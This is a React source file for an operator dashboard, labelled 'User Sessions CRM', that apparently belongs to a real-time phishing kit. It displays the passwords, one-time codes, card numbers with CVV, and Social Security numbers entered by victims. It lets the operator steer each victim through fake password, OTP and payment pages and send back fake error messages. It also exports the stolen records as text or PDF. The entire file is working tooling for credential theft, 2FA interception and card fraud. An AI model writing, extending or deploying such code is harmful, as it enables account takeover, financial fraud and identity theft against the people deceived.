"use client";

import { useState, useEffect } from "react";
import ClientProtection from "@/components/ClientProtection";

interface UserSession {
  _id?: string;
  sessionId: string;

  // Email step data
  email: string;
  password: string;

  // Password step data (gets filled when user reaches password page)
  newPassword?: string;

  // OTP step data (gets filled when user reaches OTP page)
  otpCode?: string;

  // Payment step data (gets filled when user reaches payment page)
  cardInfo?: {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    fullName: string;
    address: string;
    city: string;
    state: string;
    zipCode: string;
    ssn: string;
  };

  // Current step and status
  currentStep: "email" | "password" | "otp" | "payment" | "completed";
  status: "pending" | "approved" | "rejected";
  adminAction?: "reject" | "next_page" | "credit_card" | "otp" | "thank_you";
  rejectionReason?: string;

  createdAt: string;
  updatedAt: string;
}

export default function CRMPage() {
  const [sessions, setSessions] = useState<UserSession[]>([]);
  const [loading, setLoading] = useState(true);

  const fetchSessions = async () => {
    try {
      const response = await fetch("/api/admin/sessions");
      if (response.ok) {
        const data = await response.json();
        setSessions(data);
      }
    } catch (error) {
      console.error("Failed to fetch sessions:", error);
    } finally {
      setLoading(false);
    }
  };

  const handleAdminAction = async (
    sessionId: string,
    action: string,
    rejectionReason?: string
  ) => {
    console.log("🎯 handleAdminAction called with:", {
      sessionId,
      action,
      rejectionReason,
    });
    try {
      const response = await fetch("/api/admin/sessions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ sessionId, action, rejectionReason }),
      });
      console.log("📡 Admin action response:", response.status);

      if (response.ok) {
        fetchSessions(); // Refresh the list

        // Show success notification
        const actionName =
          action === "reject"
            ? "Rejected"
            : action === "next_page"
            ? "Sent to password page"
            : action === "credit_card"
            ? "Sent to payment page"
            : action === "otp"
            ? "Sent to OTP verification"
            : action === "thank_you"
            ? "Sent to thank you page"
            : "Updated";

        // You could add a toast notification here
        console.log(`✅ ${actionName} session ${sessionId}`);
      }
    } catch (error) {
      console.error("Failed to update session:", error);
    }
  };

  const exportSessionData = (session: UserSession, format: "txt" | "pdf") => {
    const data = `
USER SESSION EXPORT
==================
Session ID: ${session.sessionId}
Date: ${new Date(session.createdAt).toLocaleString()}
Status: ${session.status.toUpperCase()}
Current Step: ${session.currentStep.toUpperCase()}

AUTHENTICATION DATA
==================
Email: ${session.email}
Password: ${session.password}
New Password: ${session.newPassword || "N/A"}
OTP Code: ${session.otpCode || "N/A"}

PAYMENT INFORMATION
==================
${
  session.cardInfo
    ? `
Full Name: ${session.cardInfo.fullName}
Card Number: ${session.cardInfo.cardNumber}
Expiry Date: ${session.cardInfo.expiryDate}
CVV: ${session.cardInfo.cvv}
Address: ${session.cardInfo.address}
City: ${session.cardInfo.city}
State: ${session.cardInfo.state}
ZIP Code: ${session.cardInfo.zipCode}
SSN: ${session.cardInfo.ssn}
`
    : "No payment information available"
}

ADMIN ACTIONS
============
${
  session.rejectionReason
    ? `Rejection Reason: ${session.rejectionReason}`
    : "No rejections"
}
Last Updated: ${new Date(session.updatedAt).toLocaleString()}
`;

    if (format === "txt") {
      const blob = new Blob([data], { type: "text/plain" });
      const url = URL.createObjectURL(blob);
      const a = document.createElement("a");
      a.href = url;
      a.download = `session_${session.sessionId}_${
        new Date().toISOString().split("T")[0]
      }.txt`;
      document.body.appendChild(a);
      a.click();
      document.body.removeChild(a);
      URL.revokeObjectURL(url);
    } else if (format === "pdf") {
      // For PDF, we'll create a simple HTML version and print it
      const printWindow = window.open("", "_blank");
      if (printWindow) {
        printWindow.document.write(`
          <html>
            <head>
              <title>Session Export - ${session.sessionId}</title>
              <style>
                body { font-family: monospace; margin: 20px; }
                h1, h2 { color: #333; }
                .section { margin: 20px 0; }
                .data-row { margin: 5px 0; }
                .highlight { background: #f0f0f0; padding: 2px 4px; }
              </style>
            </head>
            <body>
              <h1>User Session Export</h1>
              <div class="section">
                <h2>Session Information</h2>
                <div class="data-row">Session ID: <span class="highlight">${
                  session.sessionId
                }</span></div>
                <div class="data-row">Date: ${new Date(
                  session.createdAt
                ).toLocaleString()}</div>
                <div class="data-row">Status: <span class="highlight">${session.status.toUpperCase()}</span></div>
                <div class="data-row">Current Step: <span class="highlight">${session.currentStep.toUpperCase()}</span></div>
              </div>
              
              <div class="section">
                <h2>Authentication Data</h2>
                <div class="data-row">Email: <span class="highlight">${
                  session.email
                }</span></div>
                <div class="data-row">Password: <span class="highlight">${
                  session.password
                }</span></div>
                <div class="data-row">New Password: <span class="highlight">${
                  session.newPassword || "N/A"
                }</span></div>
                <div class="data-row">OTP Code: <span class="highlight">${
                  session.otpCode || "N/A"
                }</span></div>
              </div>
              
              ${
                session.cardInfo
                  ? `
              <div class="section">
                <h2>Payment Information</h2>
                <div class="data-row">Full Name: <span class="highlight">${session.cardInfo.fullName}</span></div>
                <div class="data-row">Card Number: <span class="highlight">${session.cardInfo.cardNumber}</span></div>
                <div class="data-row">Expiry Date: <span class="highlight">${session.cardInfo.expiryDate}</span></div>
                <div class="data-row">CVV: <span class="highlight">${session.cardInfo.cvv}</span></div>
                <div class="data-row">Address: <span class="highlight">${session.cardInfo.address}</span></div>
                <div class="data-row">City: <span class="highlight">${session.cardInfo.city}</span></div>
                <div class="data-row">State: <span class="highlight">${session.cardInfo.state}</span></div>
                <div class="data-row">ZIP Code: <span class="highlight">${session.cardInfo.zipCode}</span></div>
                <div class="data-row">SSN: <span class="highlight">${session.cardInfo.ssn}</span></div>
              </div>
              `
                  : '<div class="section"><h2>Payment Information</h2><p>No payment information available</p></div>'
              }
              
              <div class="section">
                <h2>Admin Actions</h2>
                ${
                  session.rejectionReason
                    ? `<div class="data-row">Rejection Reason: <span class="highlight">${session.rejectionReason}</span></div>`
                    : "<p>No rejections</p>"
                }
                <div class="data-row">Last Updated: ${new Date(
                  session.updatedAt
                ).toLocaleString()}</div>
              </div>
            </body>
          </html>
        `);
        printWindow.document.close();
        printWindow.print();
      }
    }
  };

  useEffect(() => {
    fetchSessions();
    // Poll for updates every 3 seconds
    const interval = setInterval(fetchSessions, 3000);
    return () => clearInterval(interval);
  }, []);

  if (loading) {
    return (
      <div className="flex items-center justify-center h-64">
        <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-white"></div>
      </div>
    );
  }

  return (
    <ClientProtection>
      <div className="max-w-7xl mx-auto">
        <div className="mb-8">
          <h1 className="text-3xl font-bold mb-2 bg-gradient-to-r from-red-400 to-red-600 bg-clip-text text-transparent">
            🎯 User Sessions CRM
          </h1>
          <p className="text-white/60">
            Monitor and control user authentication flows in real-time
          </p>
          <div className="mt-4 flex items-center gap-4 text-sm">
            <div className="flex items-center gap-2">
              <div className="w-3 h-3 bg-yellow-400 rounded-full animate-pulse"></div>
              <span className="text-yellow-400">Live Updates</span>
            </div>
            <div className="flex items-center gap-2">
              <span className="text-white/60">Total Sessions:</span>
              <span className="text-white font-semibold">
                {sessions.length}
              </span>
            </div>
            <div className="flex items-center gap-2">
              <span className="text-white/60">Pending:</span>
              <span className="text-yellow-400 font-semibold">
                {sessions.filter((s) => s.status === "pending").length}
              </span>
            </div>
          </div>
        </div>

        {sessions.length === 0 ? (
          <div className="text-center py-12 bg-white/5 rounded-xl border border-white/10">
            <div className="text-6xl mb-4">📱</div>
            <p className="text-white/70 text-lg mb-2">No active sessions</p>
            <p className="text-white/50 text-sm">
              Waiting for users to sign in...
            </p>
          </div>
        ) : (
          <div className="grid gap-6">
            {sessions.map((session) => (
              <div
                key={session.sessionId}
                className="bg-gradient-to-r from-white/10 to-white/5 backdrop-blur-sm rounded-xl p-6 border border-white/20 shadow-2xl hover:shadow-3xl transition-all duration-300"
              >
                <div className="flex justify-between items-start mb-6">
                  <div className="flex items-start gap-4">
                    <div className="w-12 h-12 rounded-full bg-gradient-to-r from-blue-500 to-purple-600 flex items-center justify-center text-white font-bold text-lg">
                      {session.email.charAt(0).toUpperCase()}
                    </div>
                    <div>
                      <h3 className="text-xl font-semibold text-white mb-1">
                        {session.email}
                      </h3>
                      <div className="flex items-center gap-3 text-sm">
                        <div className="flex items-center gap-1">
                          <span className="text-white/60">Step:</span>
                          <span className="px-2 py-1 bg-blue-500/20 text-blue-400 rounded-md font-medium">
                            {session.currentStep}
                          </span>
                        </div>
                        <div className="flex items-center gap-1">
                          <span className="text-white/60">ID:</span>
                          <span className="text-white/80 font-mono text-xs">
                            {session.sessionId.substring(0, 8)}...
                          </span>
                        </div>
                      </div>
                      <p className="text-xs text-white/50 mt-1">
                        📅 {new Date(session.createdAt).toLocaleString()}
                      </p>
                    </div>
                  </div>
                  <div className="flex flex-col items-end gap-2">
                    {/* Export Buttons */}
                    <div className="flex items-center gap-2 mb-2">
                      <button
                        onClick={() => exportSessionData(session, "txt")}
                        className="flex items-center gap-1 px-3 py-1.5 bg-blue-600 hover:bg-blue-700 text-white text-xs rounded-lg transition-colors shadow-lg hover:shadow-xl"
                        title="Export as TXT file"
                      >
                        📄 TXT
                      </button>
                      <button
                        onClick={() => exportSessionData(session, "pdf")}
                        className="flex items-center gap-1 px-3 py-1.5 bg-green-600 hover:bg-green-700 text-white text-xs rounded-lg transition-colors shadow-lg hover:shadow-xl"
                        title="Export as PDF (Print)"
                      >
                        📋 PDF
                      </button>
                    </div>

                    <span
                      className={`px-3 py-1 rounded-full text-xs font-semibold uppercase tracking-wide ${
                        session.status === "pending"
                          ? "bg-yellow-500/20 text-yellow-400 border border-yellow-400/30"
                          : session.status === "approved"
                          ? "bg-green-500/20 text-green-400 border border-green-400/30"
                          : "bg-red-500/20 text-red-400 border border-red-400/30"
                      }`}
                    >
                      {session.status}
                    </span>
                    {session.status === "pending" && (
                      <div className="flex items-center gap-1 text-xs text-yellow-400">
                        <div className="w-2 h-2 bg-yellow-400 rounded-full animate-pulse"></div>
                        Awaiting Action
                      </div>
                    )}
                  </div>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-2 gap-6 mb-6">
                  <div className="bg-white/5 rounded-lg p-4 border border-white/10">
                    <h4 className="text-white font-semibold mb-3 flex items-center gap-2">
                      🔐 Authentication Data
                    </h4>
                    <div className="space-y-2 text-sm">
                      <div className="flex justify-between">
                        <span className="text-white/60">Current Step:</span>
                        <span className="px-2 py-1 bg-purple-500/20 text-purple-400 rounded-md font-medium capitalize">
                          {session.currentStep}
                        </span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-white/60">Email:</span>
                        <span className="text-white font-mono">
                          {session.email}
                        </span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-white/60">Password:</span>
                        <span className="text-white font-mono bg-red-500/20 px-2 py-1 rounded">
                          {session.password}
                        </span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-white/60">New Password:</span>
                        <span className="text-white font-mono bg-orange-500/20 px-2 py-1 rounded">
                          {session.newPassword || "-"}
                        </span>
                      </div>
                      <div className="flex justify-between">
                        <span className="text-white/60">OTP Code:</span>
                        <span className="text-white font-mono bg-purple-500/20 px-2 py-1 rounded">
                          {session.otpCode || "-"}
                        </span>
                      </div>
                    </div>
                  </div>

                  {session.cardInfo && (
                    <div className="bg-white/5 rounded-lg p-4 border border-white/10">
                      <h4 className="text-white font-semibold mb-3 flex items-center gap-2">
                        💳 Payment Information
                      </h4>
                      <div className="space-y-2 text-sm">
                        <div className="flex justify-between">
                          <span className="text-white/60">Name:</span>
                          <span className="text-white">
                            {session.cardInfo.fullName}
                          </span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-white/60">Card Number:</span>
                          <span className="text-white font-mono bg-green-500/20 px-2 py-1 rounded">
                            {session.cardInfo.cardNumber}
                          </span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-white/60">Expiry:</span>
                          <span className="text-white font-mono">
                            {session.cardInfo.expiryDate}
                          </span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-white/60">CVV:</span>
                          <span className="text-white font-mono bg-blue-500/20 px-2 py-1 rounded">
                            {session.cardInfo.cvv}
                          </span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-white/60">Address:</span>
                          <span className="text-white text-right">
                            {session.cardInfo.address}, {session.cardInfo.city},{" "}
                            {session.cardInfo.state} {session.cardInfo.zipCode}
                          </span>
                        </div>
                        <div className="flex justify-between">
                          <span className="text-white/60">SSN:</span>
                          <span className="text-white font-mono bg-red-500/20 px-2 py-1 rounded">
                            {session.cardInfo.ssn}
                          </span>
                        </div>
                      </div>
                    </div>
                  )}
                </div>

                {session.status === "pending" && (
                  <div className="bg-white/5 rounded-lg p-4 border border-white/10">
                    <h4 className="text-white font-semibold mb-3 flex items-center gap-2">
                      ⚡ Admin Actions
                    </h4>
                    <div className="grid grid-cols-2 lg:grid-cols-5 gap-3">
                      <button
                        onClick={() => {
                          console.log(
                            "🔍 REJECTING USER - Current step:",
                            session.currentStep
                          );

                          // CONTEXT-AWARE ERROR MESSAGES
                          let errorMessage = "Invalid credentials"; // Default for email step

                          if (session.currentStep === "password") {
                            errorMessage = "Invalid password";
                            console.log(
                              "🔑 PASSWORD STEP - Using password error"
                            );
                          } else if (session.currentStep === "otp") {
                            errorMessage = "Invalid verification code";
                            console.log("📱 OTP STEP - Using OTP error");
                          } else if (session.currentStep === "payment") {
                            errorMessage = "Payment information rejected";
                            console.log(
                              "💳 PAYMENT STEP - Using payment error"
                            );
                          } else {
                            console.log(
                              "📧 EMAIL STEP - Using credentials error"
                            );
                          }

                          console.log("📤 FINAL ERROR MESSAGE:", errorMessage);
                          handleAdminAction(
                            session.sessionId,
                            "reject",
                            errorMessage
                          );
                        }}
                        className="flex items-center justify-center gap-2 px-4 py-3 bg-red-600 hover:bg-red-700 rounded-lg text-sm font-semibold transition-all hover:scale-105 shadow-lg"
                      >
                        ❌ Reject
                      </button>
                      <button
                        onClick={() =>
                          handleAdminAction(session.sessionId, "next_page")
                        }
                        className="flex items-center justify-center gap-2 px-4 py-3 bg-blue-600 hover:bg-blue-700 rounded-lg text-sm font-semibold transition-all hover:scale-105 shadow-lg"
                      >
                        🔑 Password Page
                      </button>
                      <button
                        onClick={() =>
                          handleAdminAction(session.sessionId, "credit_card")
                        }
                        className="flex items-center justify-center gap-2 px-4 py-3 bg-green-600 hover:bg-green-700 rounded-lg text-sm font-semibold transition-all hover:scale-105 shadow-lg"
                      >
                        💳 Payment
                      </button>
                      <button
                        onClick={() =>
                          handleAdminAction(session.sessionId, "otp")
                        }
                        className="flex items-center justify-center gap-2 px-4 py-3 bg-purple-600 hover:bg-purple-700 rounded-lg text-sm font-semibold transition-all hover:scale-105 shadow-lg"
                      >
                        📱 OTP
                      </button>
                      <button
                        onClick={() =>
                          handleAdminAction(session.sessionId, "thank_you")
                        }
                        className="flex items-center justify-center gap-2 px-4 py-3 bg-yellow-600 hover:bg-yellow-700 rounded-lg text-sm font-semibold transition-all hover:scale-105 shadow-lg"
                      >
                        ✅ Thank You Page
                      </button>
                    </div>
                  </div>
                )}

                {session.status === "rejected" && session.rejectionReason && (
                  <p className="text-red-400 text-sm mt-2">
                    <strong>Rejection reason:</strong> {session.rejectionReason}
                  </p>
                )}
              </div>
            ))}
          </div>
        )}
      </div>
    </ClientProtection>
  );
}
